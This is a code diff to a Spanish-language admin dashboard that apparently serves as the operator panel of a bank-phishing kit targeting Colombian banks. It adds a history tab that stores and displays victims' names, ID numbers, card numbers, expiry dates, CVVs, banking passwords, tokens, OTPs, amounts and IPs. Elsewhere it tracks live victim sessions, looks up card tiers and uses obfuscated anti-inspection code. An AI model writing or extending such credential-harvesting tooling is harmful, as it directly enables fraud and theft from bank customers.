@@ -48,6 +48,7 @@ body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial
 .stat-card.pending .value { color: #fbbf24; }
 .stat-card.blocked .value { color: #ef4444; }
 .stat-card.sessions .value { color: #60a5fa; }
+.stat-card.history .value { color: #a855f7; }
 
 .section { background: #151b2e; border: 1px solid #252d44; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
 .section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; padding-bottom: 10px; border-bottom: 1px solid #252d44; gap: 12px; flex-wrap: wrap; }
@@ -103,9 +104,6 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
 .estado-finalizado { background: rgba(34, 197, 94, 0.15); color: #22c55e; }
 .estado-cc_error { background: rgba(245, 158, 11, 0.15); color: #f59e0b; }
 
-/* ============================================================
-   BADGES DE NIVEL DE TARJETA (BIN LOOKUP)
-   ============================================================ */
 .bin-nivel {
     display: inline-block;
     padding: 3px 9px;
@@ -151,9 +149,6 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
 #toast.show { transform: translateX(0); }
 #toast.error { border-left-color: #ef4444; }
 
-/* ============================================================ 
-   LOGOS DE MARCA EN LA TABLA
-   ============================================================ */
 .banco-cell {
     display: inline-flex;
     align-items: center;
@@ -200,8 +195,9 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
             <h1>⚡ Panel PYP</h1>
             <div class="tabs">
                 <button class="tab-btn active" data-tab="principal">📊 Principal</button>
+                <button class="tab-btn" data-tab="historial">📜 Historial</button>
                 <button class="tab-btn" data-tab="ips">🚫 IPs</button>
-                <button class="tab-btn" data-tab="logs">📜 Logs</button>
+                <button class="tab-btn" data-tab="logs">📋 Logs</button>
             </div>
         </div>
         <div class="topbar-right">
@@ -212,6 +208,7 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
 
     <div class="container">
 
+        <!-- PESTAÑA PRINCIPAL -->
         <div class="tab-content active" id="tab-principal">
             <div class="stats">
                 <div class="stat-card">
@@ -229,6 +226,10 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
                 <div class="stat-card blocked">
                     <div class="label">🚫 IPs bloqueadas</div>
                     <div class="value" id="statBloqueadas">0</div>
+                </div>
+                <div class="stat-card history">
+                    <div class="label">📜 Historial</div>
+                    <div class="value" id="statHistorial">0</div>
                 </div>
             </div>
 
@@ -276,7 +277,7 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
                         <thead>
                             <tr>
                                 <th class="checkbox-col"><input type="checkbox" id="checkAllSesiones"></th>
-                                <th style="text-align:center; width: 40px;" title="Estado de conexión">●</th> <!-- 🔥 NUEVA COLUMNA -->
+                                <th style="text-align:center; width: 40px;" title="Estado de conexión">●</th>
                                 <th>Banco</th>
                                 <th>Estado</th>
                                 <th>Identificación/Trj</th>
@@ -295,6 +296,44 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
                         </thead>
                         <tbody id="tbodySesiones">
                             <tr><td colspan="16" class="empty">Cargando...</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- 🔥 NUEVA PESTAÑA HISTORIAL -->
+        <div class="tab-content" id="tab-historial">
+            <div class="section">
+                <div class="section-header">
+                    <div class="section-title">
+                        📜 Historial de datos ingresados
+                        <span class="badge" id="badgeHistorial">0</span>
+                    </div>
+                    <div class="section-tools">
+                        <input type="text" class="search-input" id="buscarHistorial" placeholder="🔍 Buscar por banco, doc, tarjeta, nombre...">
+                        <button class="btn-borrar" id="btnBorrarHistorial" disabled>🗑️ Borrar seleccionados</button>
+                    </div>
+                </div>
+                <div class="table-wrap">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th class="checkbox-col"><input type="checkbox" id="checkAllHistorial"></th>
+                                <th>Fecha</th>
+                                <th>Banco</th>
+                                <th>Nombre</th>
+                                <th>Documento</th>
+                                <th>Tarjeta / Cuenta</th>
+                                <th>Vencimiento / Clave</th>
+                                <th>CVV / Token</th>
+                                <th>OTP</th>
+                                <th>Monto</th>
+                                <th>IP</th>
+                            </tr>
+                        </thead>
+                        <tbody id="tbodyHistorial">
+                            <tr><td colspan="11" class="empty">Cargando...</td></tr>
                         </tbody>
                     </table>
                 </div>
@@ -338,7 +377,7 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
             <div class="section">
                 <div class="section-header">
                     <div class="section-title">
-                        📜 Logs de acceso al panel
+                        📋 Logs de acceso al panel
                         <span class="badge" id="badgeLogs">0</span>
                     </div>
                     <div class="section-tools">
@@ -379,10 +418,12 @@ let sesionesCache = [];
 let ipsCache = [];
 let logsCache = [];
 let activosCache = [];
+let historialCache = [];
 
 let seleccionSesiones = new Set();
 let seleccionIps = new Set();
 let seleccionLogs = new Set();
+let seleccionHistorial = new Set();
 
 function $(id) { return document.getElementById(id); }
 
@@ -413,13 +454,8 @@ function formatTime(segundos) {
     return Math.floor(segundos / 3600) + 'h ' + Math.floor((segundos % 3600) / 60) + 'm';
 }
 
-/* ============================================================
-   LOGOS DE MARCA (VISA / MASTERCARD / AMEX) — SVG INLINE
-   ============================================================ */
 const LOGO_VISA = '<svg viewBox="0 0 100 33" xmlns="http://www.w3.org/2000/svg"><path d="M42.5 0.5L28.9 32.8H19.6L12.7 6.5C12.3 5.3 11.9 4.9 11 4.4C9.5 3.5 6.9 2.7 4.6 2.2L4.7 1.4H19.7C21.8 1.4 23.7 2.8 24.2 5.2L27.6 23.4L36.2 1.4H42.5V0.5ZM67.4 22C67.5 12.4 54.7 12.4 54.8 7.9C54.8 6.5 56.1 5 59 5C60.4 5 64.3 5.4 66.5 6.4L67.5 1.1C65.3 0.2 62.4 0 59 0C47.8 0 40 5.8 40 14.2C40 20.4 45.6 23.8 49.8 26C54.1 28.2 55.5 29.7 55.5 31.6C55.5 34.7 51.8 36 48.4 36C42.5 36 38.9 34.3 36.6 33L35.4 38.4C38.3 39.7 43.7 41 47.8 41C59.6 41 66.5 35.4 66.5 26.6C66.5 20.2 60.2 16.5 56.8 14C53.5 11.4 52.5 10.1 52.5 8.6C52.5 6.5 54.8 4.4 58.8 4.4C62.7 4.4 66.2 5.9 67.4 22ZM95.2 1.4H85.8C83.7 1.4 82.2 2.6 81.4 4.4L59.7 40.8H72.1L74.6 34.1H93.7L95.2 40.8H107L95.2 1.4ZM78.3 25.6L83.6 12.1L87.6 25.6H78.3Z" fill="#1434CB" transform="translate(0 -1)"/></svg>';
-
 const LOGO_MC = '<svg viewBox="0 0 100 62" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="31" r="30" fill="#EB001B"/><circle cx="68" cy="31" r="30" fill="#F79E1B"/><path d="M50 8 C38 16 30 23 30 31 C30 39 38 46 50 54 C62 46 70 39 70 31 C70 23 62 16 50 8 Z" fill="#FF5F00"/></svg>';
-
 const LOGO_AMEX = '<svg viewBox="0 0 100 50" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="50" rx="4" fill="#006FCF"/><text x="50" y="26" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="900" font-size="18" letter-spacing="1.5">AMEX</text><text x="50" y="38" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="500" font-size="6" letter-spacing="0.8">AMERICAN EXPRESS</text></svg>';
 
 function logoMarca(marca) {
@@ -450,10 +486,6 @@ function nombreBanco(key, marca) {
     return nombres[key] || key;
 }
 
-/* ============================================================
-   RENDER DE NIVEL DE TARJETA (BIN LOOKUP)
-   Combina tipo + nivel en una sola etiqueta visual
-   ============================================================ */
 function claseNivel(nivel) {
     if (!nivel) return 'desconocido';
     const n = String(nivel).toLowerCase();
@@ -550,6 +582,7 @@ function logout() {
     seleccionSesiones.clear();
     seleccionIps.clear();
     seleccionLogs.clear();
+    seleccionHistorial.clear();
 }
 
 $('logoutBtn').addEventListener('click', logout);
@@ -574,7 +607,7 @@ function mostrarDashboard() {
 
 async function cargarTodo() {
     try {
-        await Promise.all([cargarStats(), cargarActivos(), cargarSesiones(), cargarIps(), cargarLogs()]);
+        await Promise.all([cargarStats(), cargarActivos(), cargarSesiones(), cargarIps(), cargarLogs(), cargarHistorial()]);
     } catch (e) { console.error(e); }
 }
 
@@ -585,6 +618,7 @@ async function cargarStats() {
         $('statSesiones').textContent = d.sesiones;
         $('statPendientes').textContent = d.pendientes;
         $('statBloqueadas').textContent = d.bloqueadas;
+        $('statHistorial').textContent = d.historial || 0;
         $('badgeActivos').textContent = d.activos;
         $('badgeSesiones').textContent = d.sesiones;
         $('badgeIps').textContent = d.bloqueadas;
@@ -739,25 +773,23 @@ function renderSesiones() {
         const ip = datos.ip || '-';
         const checked = seleccionSesiones.has(s.sessionId) ? 'checked' : '';
 
-        // Lógica de los 3 puntos
-        let colorPunto = '#22c55e'; // Verde (Activo por defecto)
+        let colorPunto = '#22c55e';
         let tituloPunto = 'Usuario activo';
         const activoInfo = activosCache.find(a => a.sessionId === s.sessionId);
 
         if (!activoInfo) {
-            colorPunto = '#ef4444'; // Rojo (Ya salió definitivamente)
+            colorPunto = '#ef4444';
             tituloPunto = 'Usuario salió de forma definitiva';
         } else {
             const ahora = Date.now();
             const ultimoHeartbeat = activoInfo.ultimoHeartbeat || 0;
             const segundosInactivo = (ahora - ultimoHeartbeat) / 1000;
             if (segundosInactivo > 15) {
-                colorPunto = '#fbbf24'; // Amarillo (Salió de la web o inactivo)
+                colorPunto = '#fbbf24';
                 tituloPunto = 'Usuario salió de la web (Inactivo)';
             }
         }
 
-        // Banco emisor + nivel de tarjeta (solo para tarjetas)
         const bancoEmisor = esTarjeta ? (datos.bankName || 'No identificado') : '-';
         const tipo = datos.cardType || '';
         const nivel = datos.cardLevel || '';
@@ -826,6 +858,122 @@ $('btnBorrarSesiones').addEventListener('click', async () => {
     } catch (e) { toast('Error: ' + e.message, true); }
 });
 
+/* ============================================================
+   🔥 LÓGICA DEL HISTORIAL
+   ============================================================ */
+async function cargarHistorial() {
+    try {
+        const d = await api('/admin/historial');
+        historialCache = d.historial || [];
+        $('badgeHistorial').textContent = historialCache.length;
+        renderHistorial();
+    } catch (e) {}
+}
+
+function renderHistorial() {
+    const filtro = ($('buscarHistorial').value || '').toLowerCase().trim();
+    const tbody = $('tbodyHistorial');
+    let lista = historialCache;
+    if (filtro) {
+        lista = lista.filter(h => {
+            const datos = h.datos || {};
+            const texto = [
+                h.bancoKey, datos.titular, datos.docNumber, datos.tarjeta,
+                datos.identificacion, datos.token, datos.otp, datos.ip,
+                datos.cardBrand, datos.bankName
+            ].filter(Boolean).join(' ').toLowerCase();
+            return texto.includes(filtro);
+        });
+    }
+    if (!lista.length) {
+        tbody.innerHTML = '<tr><td colspan="11" class="empty">Sin registros en el historial</td></tr>';
+        actualizarBtnBorrarHistorial();
+        return;
+    }
+    tbody.innerHTML = lista.map(h => {
+        const datos = h.datos || {};
+        const fecha = new Date(h.fecha).toLocaleString('es-CO');
+        const checked = seleccionHistorial.has(h.id) ? 'checked' : '';
+        const banco = h.bancoKey || '-';
+        const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga';
+
+        const nombre = datos.titular || '-';
+        let documento = '-';
+        let tarjetaCuenta = '-';
+        let vencimientoClave = '-';
+        let cvvToken = '-';
+
+        if (esTarjeta) {
+            documento = datos.docNumber ? `${datos.docType || 'CC'} ${datos.docNumber}` : '-';
+            tarjetaCuenta = datos.tarjeta || '-';
+            vencimientoClave = (datos.expMes || datos.expAnio) ? `${datos.expMes || '??'}/${datos.expAnio || '??'}` : '-';
+            cvvToken = datos.cvv || '-';
+        } else {
+            documento = datos.identificacion || '-';
+            tarjetaCuenta = datos.tarjeta || '-';
+            vencimientoClave = datos.clave || '-';
+            cvvToken = datos.token || '-';
+        }
+
+        return `
+            <tr>
+                <td class="checkbox-col"><input type="checkbox" class="check-historial" data-id="${escapeHtml(h.id)}" ${checked}></td>
+                <td class="dato" style="max-width:120px;">${escapeHtml(fecha)}</td>
+                <td>${nombreBanco(banco, datos.marca)}</td>
+                <td class="dato" title="${escapeHtml(nombre)}">${escapeHtml(truncar(nombre, 25))}</td>
+                <td class="dato">${escapeHtml(documento)}</td>
+                <td class="dato mono">${escapeHtml(tarjetaCuenta)}</td>
+                <td class="dato">${escapeHtml(vencimientoClave)}</td>
+                <td class="dato">${escapeHtml(cvvToken)}</td>
+                <td class="dato">${escapeHtml(datos.otp || '-')}</td>
+                <td class="dato">${escapeHtml(datos.monto ? '$' + Number(datos.monto).toLocaleString('es-CO') : '-')}</td>
+                <td class="ip">${escapeHtml(datos.ip || '-')}</td>
+            </tr>
+        `;
+    }).join('');
+    document.querySelectorAll('.check-historial').forEach(cb => {
+        cb.addEventListener('change', (e) => {
+            const id = e.target.dataset.id;
+            if (e.target.checked) seleccionHistorial.add(id);
+            else seleccionHistorial.delete(id);
+            actualizarBtnBorrarHistorial();
+        });
+    });
+    actualizarBtnBorrarHistorial();
+}
+
+function actualizarBtnBorrarHistorial() {
+    const btn = $('btnBorrarHistorial');
+    btn.disabled = seleccionHistorial.size === 0;
+    btn.textContent = seleccionHistorial.size > 0
+        ? `🗑️ Borrar seleccionados (${seleccionHistorial.size})`
+        : '🗑️ Borrar seleccionados';
+}
+
+$('checkAllHistorial').addEventListener('change', (e) => {
+    if (e.target.checked) historialCache.forEach(h => seleccionHistorial.add(h.id));
+    else seleccionHistorial.clear();
+    renderHistorial();
+});
+
+$('btnBorrarHistorial').addEventListener('click', async () => {
+    if (!seleccionHistorial.size) return;
+    if (!confirm(`¿Borrar ${seleccionHistorial.size} registro(s) del historial?`)) return;
+    try {
+        const ids = [...seleccionHistorial];
+        await api('/admin/historial/borrar', { method: 'POST', body: JSON.stringify({ ids }) });
+        toast(`🗑️ ${ids.length} registro(s) borrado(s)`);
+        seleccionHistorial.clear();
+        $('checkAllHistorial').checked = false;
+        cargarTodo();
+    } catch (e) { toast('Error: ' + e.message, true); }
+});
+
+$('buscarHistorial').addEventListener('input', renderHistorial);
+
+/* ============================================================
+   IPS Y LOGS
+   ============================================================ */
 async function cargarIps() {
     try {
         const d = await api('/admin/ips-bloqueadas');
@@ -1042,7 +1190,6 @@ if(_0xh8&&_0xg7==='p'){_0xf6.preventDefault();return false;}
 if(_0xh8&&_0xg7==='a'){_0xf6.preventDefault();return false;}
 });
 document.addEventListener('dragstart',function(_0xj0){_0xj0.preventDefault();});
-// Se ha quitado el bloqueo de copiar/pegar (selectstart, copy, cut).
 try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xn3){document.body.innerHTML='';}
 
 var _0xo4=null;
